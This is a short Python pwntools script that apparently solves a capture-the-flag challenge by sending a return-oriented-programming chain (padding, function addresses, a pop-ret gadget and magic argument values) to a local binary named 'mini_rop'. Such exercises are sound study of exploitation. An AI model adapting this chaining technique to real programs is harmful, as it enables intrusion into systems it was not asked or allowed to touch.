#!/usr/bin/python
from pwn import *


padding = b'A' * 28

win1_addr = p32(0x80485cb)
win2_addr = p32(0x80485d8)
flag_addr = p32(0x804862b)

pop_ret_gadget = p32(0x08048806)

arg_check1 = p32(0xBAAAAAAD)
arg_check2 = p32(0xDEADBAAD)

exploit = padding + win1_addr + win2_addr + pop_ret_gadget + arg_check1 + flag_addr + pop_ret_gadget + arg_check2

bash = process('./mini_rop')
print(bash.recv())
bash.sendline(exploit)
print(bash.recv())
